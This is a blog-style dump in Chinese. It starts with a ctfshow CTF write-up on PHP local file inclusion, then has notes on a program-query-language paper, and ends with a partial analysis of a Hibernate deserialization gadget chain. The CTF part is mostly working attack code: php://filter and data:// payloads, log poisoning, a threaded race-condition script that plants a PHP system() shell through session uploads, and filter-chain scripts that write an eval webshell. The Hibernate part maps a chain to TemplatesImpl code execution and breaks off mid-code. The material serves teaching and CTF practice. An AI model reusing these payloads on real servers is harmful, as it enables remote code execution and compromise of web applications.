@link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n1.php://filter  主要用于读取源码2.php://input  经常使用file_get_contents获取php://input内容3.data://  执行命令4.file://  访问本地文件系统\n所以就直接php://filter协议读取源码，目标猜测为flag.php。另外说一下include函数的特性，如果返回的内容为php代码，那么就会被执行；而如果未被识别为php代码，则会直接返回读取的内容。这也是为什么要用filter进行一个base64编码的原因\nfile=php://filter/read=convert.base64-encode/resource=flag.php\n\nweb79. 文件包含系列开始\n\n题面如下，对php关键词进行了一个替换\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:10:14# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:12:38# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n试了一下大小写绕不过去，那么就更换另一个支持数据流封装的协议——data://\nfile=data://text/plain;base64,PD9waHAgc2hvd19zb3VyY2UoJ2ZsYWcucGhwJyk7IA==\n\n\n\nweb80. 文件包含系列开始\n\n题面如下，过滤了php和data关键字\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 11:26:29# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n诶php伪协议对于php://input是支持大小写的，所以可以大小写绕过（前面题不行不知道为啥）\n\n\n\n\nweb81.\n\n题面如下，这下:给我过滤了，也就是直接使用伪协议是不行了，看看有没有可利用的日志文件\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 15:51:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n题目的中间件为nginx，我们试着访问一下/var/log/nginx/access.log\n{:height 282, :width 641}\n\n可以利用，于是直接抓包忘日志里写shell即，之后再包含日志文件\n\n\n\n\nweb82. session文件包含\n\n先看题面，过滤了.，所以日志包含也用不了\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 19:34:45# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n针对PHP 在文件上传session相关的信息\n\n这个特点告诉我们可以通过POST方式利用session.upload_progress将shell写入一个session中，然后包含getshell 接下来需要解决的问题是：1. 如何创建这个session文件 2. 能创建，怎么知道session文件的位置\n针对PHP 5.4后 php.ini中的一些默认选项设置我们需要知道\n1.session.upload_progress.enabled = on2.session.upload_progress.cleanup = on3.session.upload_progress.prefix = “upload_progress_”4.session.upload_progress.name = “PHP_SESSION_UPLOAD_PROGRESS”5.session.use_strict_mode=off\n关注最后一个设置，也就是说PHPSESSID值也为我们所控\n\n\n此时用户是可以自己定义Session ID的。比如，我们在Cookie里设置PHPSESSID=flag，PHP将会在服务器上创建一个文件：/tmp/sess_flag。即使此时用户没有初始化Session，PHP也会自动初始化Session,并产生一个键值(注：在Linux系统中，session文件一般的默认存储位置为 /tmp 或 /var/lib/php/session)\n\n这个关键信息同时解决了session文件创建和位置信息；只需要通过cookie传入文件名，POST传session.upload_progress对应的shell即可。然而，还有一个设置项session.upload_progress.cleanup = on不能忽略，这里就是说文件上传结束后，session即清楚，也就是session文件会被抹去，我们也就无法进行包含。这里就可以采用条件竞争的方式，再文件还未完全上传完时进行包含getshell\n\n# coding=gbkimport threadingimport requestsurl = &quot;http://b48c883b-c8c0-4d1b-8d3e-c4b8bf0ab158.challenge.ctf.show/&quot;cookie = &#123;&#x27;PHPSESSID&#x27;: &#x27;flag&#x27;&#125;data = &#123;    &quot;upload_progress_&quot;: 1,    &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#x27;nl fl0g.php&#x27;); ?&gt;hacker&quot;&#125;def write(session):    while True:        r = session.post(url, cookies=cookie, data=data, files=&#123;&#x27;file&#x27;: open(&#x27;/Users/racerz/Desktop/fuzz.txt&#x27;, &#x27;r&#x27;).read()&#125;)    def read(session):    while True:        r = session.get(url+&quot;?file=/tmp/sess_flag&quot;)        print(r.status_code)        if &quot;hacker&quot; in r.text:            print(r.text)            breaksession = requests.session()for i in range(10):    threading.Thread(target=write, args=(session, )).start()read(session)\n\n\n\nweb83. 继续包含\n\n查看题面，可以看到首行多了warning\nWarning: session_destroy(): Trying to destroy uninitialized session in /var/www/html/index.php on line 14&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 20:28:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/session_unset();session_destroy();if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n查看一下session_destroy()\n\n也就是说，仅需再调用一下session_start()即可恢复变量使用，不过脚本可以直接跑通\n\n\n\nweb84. 文件包含漏洞\n\n题面如下，在文件包含之前调用了系统命令删除文件，本质利用还是条件竞争\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 20:40:01# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    system(&quot;rm -rf /tmp/*&quot;);    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\n\n\n\nweb85. 继续包含\n\n题面如下，对包含的文件内容做了过滤，不能含有&lt;，但是依然可以条件竞争绕过，其实就是上一个线程if判断通过，下一个线程直接进行了include操作，这里需要增大点read函数的线程数\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 20:59:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    if(file_exists($file))&#123;        $content = file_get_contents($file);        if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123;            die(&quot;error&quot;);        &#125;        include($file);    &#125;    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n\n\nweb86. 继续秀\n\n题面如下，这题对include目录做了限制，条件竞争\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 21:20:43# @email: h1xa@ctfer.com# @link: https://ctfer.com*/define(&#x27;还要秀？&#x27;, dirname(__FILE__));set_include_path(还要秀？);if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    include($file);    &#125;else&#123;    highlight_file(__FILE__);&#125;\n\n\n\nweb87. 继续秀\n\n题面如下，这里通过file_put_contents()将字符串写入制定文件，针对urldecode()可以采用双编码绕过；而主要是后面的die将会导致整个php程序退出执行，而后面的shell无法成功利用\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-16 21:57:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    $content = $_POST[&#x27;content&#x27;];    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);    $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file);    file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);    &#125;else&#123;    highlight_file(__FILE__);&#125;\n新的知识点：[[谈一谈php://filter的妙用学习笔记]]\n这里我就用php://filter过滤器的特性来解决，先采用string.strip_tags滤掉标签，再用convert.base64-decode解码shell；直接用base64的话就需要再凑两个字节（前面是`phpdie``共6个有效字节）\nGET:file=php://filter/write=string.strip_tags|convert.base64-decode/resource=shell.php再经过双编码\nPOST:content=PD9waHAgc3lzdGVtKCdubCBmbConKTsgPz4=    //&lt;?php system(‘nl fl*’); ?&gt;\n#coding=gbkfrom urllib.parse import quoteimport requests url = &quot;http://d07e3b5f-56e3-4c61-90a5-9f0d4ea4f4e0.challenge.ctf.show/&quot;file = &quot;%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%33%25%37%34%25%37%32%25%36%39%25%37%30%25%35%66%25%37%34%25%36%31%25%36%37%25%37%33%25%37%63%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30&quot;data = &#123;    &quot;content&quot;: &quot;PD9waHAgc3lzdGVtKCdubCBmbConKTsgPz4=&quot;&#125;r = requests.post(url=(url+&quot;?file=&quot;+file), data=data)print(r.text)result = requests.get(url+&quot;shell.php&quot;).textprint(result)\n\n\n\nweb88. 继续秀\n\n题面如下，可以看到没有过滤data，可以利用data协议\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-09-17 02:27:25# @email: h1xa@ctfer.com# @link: https://ctfer.com */if(isset($_GET[&#x27;file&#x27;]))&#123;    $file = $_GET[&#x27;file&#x27;];    if(preg_match(&quot;/php|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=|\\./i&quot;, $file))&#123;        die(&quot;error&quot;);    &#125;    include($file);&#125;else&#123;    highlight_file(__FILE__);&#125;\nfile=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7由于过滤了+和=，所以要去掉\n\n\n\nweb116. misc+lfi\n\n提示本地文件包含，直接带出源码\n\n\n过滤了伪协议使用不了，试试直接包含\n\n\n\n\nweb117\n\n题面如下\n&lt;?php/*# -*- coding: utf-8 -*-# @Author: yu22x# @Date:   2020-09-16 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-01 18:16:59*/highlight_file(__FILE__);error_reporting(0);function filter($x)&#123;    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;        die(&#x27;too young too simple sometimes naive!&#x27;);    &#125;&#125;$file=$_GET[&#x27;file&#x27;];$contents=$_POST[&#x27;contents&#x27;];filter($file);file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);\n虽然一些过滤器被ban了，但是php://filter还是可以用，我们找找其它可用的过滤器\n比如下面这个convert.iconv.*\n\n所以针对我们要写的shell先经过编码，nnd没注意到utf给我过滤了\n&lt;?php$fp = fopen(&#x27;php://output&#x27;, &#x27;w&#x27;);stream_filter_append($fp, &#x27;convert.iconv.utf-16le.utf-8&#x27;);fwrite($fp, &quot;&lt;\\0?\\0p\\0h\\0p\\0 \\0s\\0y\\0s\\0t\\0e\\0m\\0(\\0&#x27;\\0n\\0l\\0 \\0f\\0l\\0*\\0&#x27;\\0)\\0;\\0 \\0?\\0&gt;\\0&quot;);fclose($fp);#  system(&#x27;nl fl*&#x27;); ?&gt;\n\n这里引入usc-2的概念，作用是对目标字符串每两位进行一反转，值得注意的是，因为是两位所以字符串需要保持在偶数位上。可以看到反转再反转就可以回来，而限制代码只经过一次反转变的不可解析\n\n#coding=gbkfrom urllib.parse import quoteimport requests url = &quot;http://3ef1d619-e0b0-4351-842d-8a093bbdf570.challenge.ctf.show/&quot;file = &quot;php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php&quot;data = &#123;    &quot;contents&quot;: r&quot;?&lt;hp pe@av(l_$OPTSd[tosa]t;)&gt;?&quot;&#125;r = requests.post(url=(url+&quot;?file=&quot;+file), data=data)print(r.text)result = requests.get(url+&quot;shell.php&quot;).textprint(result)\n\n\n\n","tags":["ctfshow"]},{"title":"《Finding Application Errors and Security Flaws Using PQL a Program Query Language》论文笔记","url":"/2023/03/31/Finding%20Application%20Errors%20and%20Security%20Flaws%20Using%20PQL%20a%20Program%20Query%20Language%20%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/","content":"Finding Application Errors and Security Flaws Using PQL: a Program Query Language 论文笔记0x1. 概要对于漏洞检错工具而言，重要的规则设计在于如何处理事件和关联对象之间相联系。本文提出了一种称为PQL（程序查询语言）的语言，它允许程序员在特定于应用程序的上下文中轻松地表达此类问题。查询类似代码的摘要信息，对应于违反设计规则的最短代码量，是对目标应用程序实现细节的抽象概括。程序员还可以在发现匹配时指定行为，例如记录相关信息或者即时纠错。\n同时，本文借助了静态分析和动态分析技术来解决 PQL 查询。首先静态分析使用了：\n\n上下文敏感分析\n流敏感分析\n基于包含的指针别名分析\n\n以此寻找潜在的匹配结果，进一步用它来减少动态分析时的插桩点。我们的动态分析器对源程序进行检测，以便在程序运行时准确地捕获所有违规行为，并有选择地执行用户指定的操作\n0x2. Introduction本文采用 PQL 查询的思想在于能够让开发者自定义特定于应用的代码模式规则。同时系统自动地从查询生成一对互补的检验器：\n\n静态检查器：寻找应用中所有的潜在匹配\n动态检查器：运行时捕获所有产生的匹配，并且可以在匹配时启动用户指定的日志记录或恢复操作\n\n关于概要中所说的事件和关联对象的处理问题，它的意思是说这些相关对象可能存储并在不同的局部变量之间传递、或者作为参数甚至保存在类集合中，同时一系列事件也覆盖在不同的方法不同的谓词上。PQL 可以利用最简单的原型码来表示关联事件，通过抽象不相关的控制流和无视对象的命名（也就是堆抽象？）, PQL 系统可以自动匹配程序中所有等效的行为\n静态检查器利用基于 found 的、上下文敏感指针分析（非流敏感）找出所有的潜在匹配，然后动态分析对这些匹配进行插桩标记，检验运行时是否真正发生\n\nsimple example:\n\n利用指针分析来匹配 getParameter 返回 object 和 execute 参数的 object 是否存在交集，如果存在交集就动态插桩标记这些点，当运行时也匹配到时就将 execute 函数替换为 checkedSQL 函数\n\nContributions\n\n开发了强大的静态分析检查器。并且将复杂的程序分析利用简单的查询语句来表述，开发者使用简单。同时，采用的指针别名分析是 sound 的，意味着会收集到所有的指针指向关系，而不会产生漏报，进一步提供给优化动态检查器\n优化的动态插桩。它这里做了两点改进：首先，PQL 并没有采样传统的基于语法的方法来检测匹配，而是通过匹配对象实例的历史事件信息（调用栈）来判断是否触发；第二，静态分析器产生的结果进一步减少了动态检查时的观测点数。\n动态错误恢复。匹配发现时允许将最后一个触发事件替换为用户指定的函数\n实验评估：程序可有效发现数据库中断或拒绝服务攻击（包括）；查询语句的产生是通过阅读 Java 库的 API 以及错误模式的描述得到\n\n\n\n0x3. PQL Language首先 PQL 关注于追踪方法调用以及获取关联对象的属性和数组元素。另外，本文将动态程序执行抽象为基本事件序列，检查器会去判断是否会有子序列匹配上给出的具体模式。\n\n抽象调用栈\n程序执行被抽象为基本事件的调用序列。PQL 关注于对象上，事件的匹配意味着对象的匹配\n每个事件包含唯一的事件 ID、事件类型和一个属性列表，以下是抽象的 8 类事件：\n\n属性的 loads 和 stores \n属性：[source, target, field name]\n\n数组的 loads 和 stores \n属性：[source, target]\n\n方法调用和返回\n属性：[method invoke, 传参中的对应 object, 返回 object] 返回事件参数包含对应调用事件的 ID\n\n对象创建\n属性：[object, class]\n\n程序结束（无属性）\n\n\nex. 如下针对数组的执行操作代码\n\n得到的抽象调用序列如下：\n\n\nPQL 查询\nPQL 查询分为模式匹配和基于匹配的行为执行两部分。\n首先看模式匹配，对应语法如下。它是由一系列基本事件通过排序、部分排序或交替构成的\n\n\n查询变量../../racerz/Desktop/论文笔记\n查询变量对应的是程序中待匹配的对象。\n\nobject 变量 ：代表堆上的单一 object，拥有 class 名来限制能匹配的对象实力种类。如果以 ! 为前缀，则表示不能匹配的类\nmember 变量：代表属性或方法名。通过文本名来匹配，但是可以采用通配符 * 或 _ 的形式来匹配\n\n\nStatements\n方法的调用会去匹配从调用事件到返回事件之间的所有事件。\n在基本事件中，对象的引用需要在 object 查询变量中声明（或 _ 无视）；成员或方法的引用可以通过字面量或者 member 查询变量中声明\n接下来是三种连接操作符：\n\na;b 指定 a 之后会跟 b ，但是之间并非连续的 。可以利用 ~ 作排除，因此 a;~_;b 可以表示连续\na|b 表示匹配事件中的任何一个\n偏序语句 a,b,c 用来匹配多个独立事件\n\nwithin 可以用来指定全匹配模式（位于 call 和 return 之间）\n\n子查询\n允许指定递归事件序列或递归对象关系。递归的作用在于可以匹配无限数量的对象（只要满足要求），类似上下文无关文法的机制，每个产生式都是相对于堆上的对象独立量化的\n对于递归查询中的 base case ，需要用 a:=b 来强制将返回值与参数统一。同时要保证形参于实参的统一、返回值与调用变量的统一\n以下图为例：\n\n\n对匹配的反应\nPQL 提供两种机制来记录匹配信息或执行恢复行为\n\nexecute 子句 内置 Util 类中的方法 Util.PrintStackTrace，参数为 * 会打印参数和调用栈信息；Util.Abort 不需要参数，直接结束程序。\n对于自定义方法，返回值要设置为 void\n\nreplace 子句 替换监视的方法为想要执行的方法，对于自定义方法需要返回值设置为和被替换方法相同类型\n\n\n\n\n\nDynamic Macher\n首先说下传统朴素的 PQL 查询匹配方法：\n\n将每一个子查询转换为非确定状态机，输入为事件序列，查找匹配查询语句的子序列，并记录每个匹配项绑定到返回查询变量的值\n插桩目标应用以产生完整的抽象调用栈\n使用查询识别器来解释所有调用栈上的状态机来检索匹配\n\n本文在这里所做的优化是：\n\n插桩代码只会关注于可能产生与匹配查询相关的事件的点\n类型分析排除与查询中的对象无关的类型上的操作\n静态分析排除掉所有无法指向查询中涉及到的对象的语句\n\nTranslation From Queries To State Machines状态机代表的查询由下列组成：\n\n状态集合，包括起始状态、失败状态和接受状态\n变量参数\n状态转移集合\n\n部分匹配由当前节点和一系列 bindings （PQL 查询中的变量到运行时堆上的映射构成）\n状态机就是以 NFA 的模式作状态转移\n三种特殊的状态转移：\n\nSkip transitions 表示自己到自己的状态转移，条件就是只要没匹配到排除事件的集合就发生\nNull transitions 不对应任何事件，直接发生转换\nSubquery invocation transitions 也就是匹配支持递归\n\n本文采用语法制导的方法构建查询的状态机，一个 statement  前后通过 bef(s) 和 aft(s) 状态关联，对应匹配 s 前和后。\n接下来讲一下这两个状态在处理基本事件时是如何表示的：\n\nArray and field operations 对于语句 s ，类型为 t。要求输入事件也是类型 t ，并且属性要求和 s 以及当前 bindings 中描述的相统一：即要么相同，要么还未绑定（之后就绑定上去）\n\nExclusion bef(s) = aft(s) skip transitions 修正为不匹配到 s’\n\nSequencing 如果 s = s1; s2 =&gt; bef(s) = bef(s1), aft(s) = aft(s2), 且 aft(s1) = bef(s2)\n\nAlternation 如果 s = s1|s2 =&gt;\n\n\nPartial order 如果 s = s1, s2 =&gt;\n\n\nMethod invocation\n\n\nCreation points\n对象创建通过方法 &lt;init&gt;，处理和 Method invocation 一样\n\nContext\n通过将自动机嵌套在 within 子句中来表示，中间有任何匹配未完成都会失败\n\nUnification statements \n表示空转移的两端变量值保持一致，要么值相等，要么一个未绑定另一个绑定（然后绑定的值传递给未绑定的）\n\nSubquery invocation 子查询匹配可作为基本事件来看待，由识别器单独处理\n\n\nInstrumenting the Application插桩点：编码（未定事件 + 相关对象）=&gt; 查询识别器 =&gt; 更新未定匹配的状态 =&gt; 返回\nThe Query Recognizer识别器会从 main 查询的部分匹配开始，每当匹配上一个事件就会产生一个新的状态，同时会绑定或更新每个事件中涉及的变量。\n一旦部分匹配转移到了 accept 状态，就会以 replaces 或 executes 来处理。\n对于子查询的处理，一旦匹配完成后，就会将返回值更新到调用查询处，并且持续接受新的子查询更新\n为了支持长输入的跟踪，本文维护了一个 hashmap 来记录每个状态转移到事件的映射，每个状态转移中还记录了变量到值的映射集\n\n\n0x4. 静态检查器 &amp; 优化本文设计了一种算法可以自动地将 PQL 查询转换为查询指针分析结果\n静态分析采用的是 sound cloning-based context-sensitive inclusion-based pointer alias analysis\n这种分析在计算每个调用边的指向关系时不需要递归，通过将每个强连通分量视为单个节点，递归程序中的调用路径被简化（？）。\n分析结果存储在演绎数据库中，数据表示简化为二元决策图。可通过 Datalog 语言查询\nThe bddbddb Program Database本文预设了 PQL 查询中的变量到 bddbddb 数据库输入的转换规则：\n数据库的字段：bytecodes B, variables V, methods M, contexts C, heap ob-jects named by their allocation site H, and integers Z\n源程序由一系列输入关系来表示：actual, ret, fldld, fldst, arrayld, arrayst 分别对应参数传递，方法返回，field loads, field stores, array loads 和 array stores,\n其他针对 datalog 中的关系谓词的设置基本和现在一样\nTranslation from PQL to Datalog将每个查询的匹配部分视为交替的 statements 序列\n每个基本 PQL 结构的处理如下：\n\nPrimitive statements\n\n\nAlternation\n\nSequencing\n根据流不敏感的特性，可直接将; 替换为 , 每一个 Datalog 变量在每个事件中保持新鲜。每个事件对应着一个 bytecode 的触发，如果所带参数未绑定，则说明该参数并未出现在程序中\n\nPartial order\n同样每个自居可看作 sequence 的一部分\n\nExclusion\n为了保证 soundess，所有 excluded 事件都直接忽略掉而不考虑其所在位置\n\nWithin\n需要找到由 m 调用的方法匹配的字节码。可以通过指针分析得到的调用图上找到\n\nUnification \n转为堆分配点相等\n\nSubqueries\n对应 Datalog relation，子查询中的任何非参数变量将会匹配通配符\n\n\nExtracting the Relevant Bytecodes对于每一个子查询，都会找出所有参数对应的程序位置和堆对象，不管是否真正调用。所以我们需要抽离出所有真正参与到查询匹配当中的 bytecodes\n通过两步实现：\n\n找到所有相关的子查询匹配，也就是促成最终结果的查询：这里用分为两种情况：\nmain 关系中的所有成员都是相关的\n任何查询关系的成员，如果作为子查询调用的转换结果出现在相关关系中，则是相关的。\n\n\n抽离出相关的程序位置，将相关查询投影到 bytecode 上：任何出现在由 1 得到的相关结果上的程序位置对于任何查询都是相关的\n\n0x5. Experiment首先是针对多个开源 Java 应用 bugs 评估静态分析、动态分析（未优化 / 优化）开销以及相应的分析结果\n\n其次针对常见的漏洞特别是 SQL 注入，设计了对应的 PQL 查询语句，构建污点传播分析\n\n本文利用 PQL 开发了一套运行时安全防御系统 「SECURIFLY」，相比于传统防火墙针对模式匹配和流量监控的防御方式，本文的构建防御体系可以更加细粒度因为它观测的是数据流在应用中的流向\n0x6. Applications Of PQL本文提到 PQL 可以编码对系统特定规则的知识，也就是抽象成一种操作模式。如何自动的去发现基于系统的规则是一个挑战性问题。本文提出了污点查询模式：数据 source 产生，通过各种技术传播，最终被用作 sink\n其次，对于漏洞匹配查询后调用的事件，通常情况下是将不安全参数替换为安全参数。但这里也可以使用故障注入的方式，即故意注入不安全的值来测试系统的鲁棒性。特别地，他可以很有效地检验 Java 中依赖于特定平台的、C  / C++ 编写的 native 方法（常见参数为 Object / array[]），可以通过传入超大数组或者 null 对象来测试是否会导致 JVM 崩溃来判断系统是否健壮。\n那么在分析之前，如何找到所有的入口点？\n\n对框架插桩并查看 this 指针在目标模块调用时的类型\n捕获调用栈（within 范围），检查控制是在哪里开始从框架转到应用\n\n其次，对于反射这种妨碍调用图或者跨函数分析的特性，可以在运行时关注超类的实例（因为经过反射类加载的实例通常都会转换为接口类或抽象类来表示），利用 PQL 表达也很方便\n","tags":["软件漏洞分析"]},{"title":"Hibernate反序列化浅析","url":"/2023/01/05/Hibernate%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/","content":"Hibernate 反序列化\nHibernate ORM enables developers to more easily write applications whose data outlives the application process. As an Object/Relational Mapping (ORM) framework, Hibernate is concerned with data persistence as it applies to relational databases (via JDBC)\n\n需要用到的类\nBasicPropertyAccessor\n该类实现的接口 PropertyAccessor，定义获取类相关属性值的策略，其中包含以下两种方法\n接收 Class对象及属性名，并返回相应的Getter和Setter类\n\n再看实现类中同样也对Getter类和Setter类进行了实现。对于Getter类，其构造方法传入了Class对象，方法对象及属性名，在get方法中利用反射触发目标对象的method方法\n\n再看BasicPropertyAccessor实现的getGetter方法，其中存在如下调用链\nGetter getGetter(Class theClass, String propertyName)-&gt; Getter createGetter(theClass, propertyName)\t-&gt; Getter getGetterOrNull(Class theClass, String propertyName)\t \t-&gt; Method getterMethod(Class theClass, String propertyName)\n\n该方法的逻辑如下：\n\n\n调用 Class 的 getDeclaredMethods 方法获取全部方法\nGetter 方法不应该有参数，如果 Method 的参数类型数量不等于0，则跳过\n如果方法类型是 BRIDGE，则跳过\n获取方法名，如果以 get 或 is 开头，则可能为 getter 方法，sub 掉前缀后进行字符串的对比，在 Introspector.decapitalize() 方法中还进行的首字母大小写的处理。\n\n\n因此这个类的作用就是getGetter方法传入指定类实例和其属性，返回的Getter对象通过调用get方法即可触发指定getter方法\n\nGetterMethodImpl\n\n\n\nAbstractComponentTuplizer\n这个类提供的作用就是辅助上面的类来调用get方法\n其拥有一个Getter类数组成员属性getters，在getPropertyValue方法中会调用指定数组元素的get方法，并传入component指定实例对象\n\n该抽象类存在两个子类，PojoComponentTuplizer和DynamicMapComponentTuplizer\n\n这对应着 Hibernate 的实体对象的类型，即 pojo 和 dynamic-map。pojo 代表将 Hibernate 类型映射为 Java 实体类，而 dynamic-map 将映射为 Map 对象。\n\n在PojoComponentTuplizer#getPropertyValues()中会调用父类的getPropertyValues方法，从而调用遍历调用getPropertyValue()\n\n这里留意一下属性optimizer，构造POC的时候可能需要用\n\nTypedValue\n\nAn ordered pair of a value and its Hibernate type\n\n接着看如何调用到getPropertyValues()方法\n\nHibernate 中定义了一个自己的类型接口 org.hibernate.type.Hibernate.Type，用来定义 Java 类型和一个或多个 JDBC 类型之间的映射。针对不同的类型有不同的实现类，开发人员也可以自己实现这个接口来自定义类型。\n\n在构造方法中，除了赋值操作还调用了initTransients()\n\n其中对hashcode属性也作了初始化操作，其创建了一个ValueHolder对象，并重写了内部接口的initialize方法\n\n该类的hashCode方法存在调用链如下\nTypedValue.hashCode()\t-&gt; ValueHolder.getValue()\t\t-&gt; ValueHolder$DeferredInitializer.initialize()\n也就是初始化时重写的方法将会被执行，其中执行了type属性的getHashCode()方法，传入参数value\n这时将type属性设置为ComponentType类，则会调用\n\n其中会调用getPropertyValue()方法，进而调用componentTuplizer属性的getPropertyValue方法\n\n\n调用链如下：\nHashMap.readObject()    TypedValue.hashCode()        ValueHolder.getValue()            ValueHolder.DeferredInitializer().initialize()                ComponentType.getHashCode()\t\t            PojoComponentTuplizer.getPropertyValue()                        AbstractComponentTuplizer.getPropertyValue()                          BasicPropertyAccessor$BasicGetter.get()/GetterMethodImpl.get()                                TemplatesImpl.getOutputProperties()\n攻击构造public class HibernateStudy2 &#123;    public static String fileName = &quot;Hibernate2.bin&quot;;    public static void main(String[] args) throws Exception &#123;        Class&lt;?&gt; componentTypeClass = Class.forName(&quot;org.hibernate.type.ComponentType&quot;);        Class&lt;?&gt; pojoComponentTuplizerClass = Class.forName(&quot;org.hibernate.tuple.component.PojoComponentTuplizer&quot;);        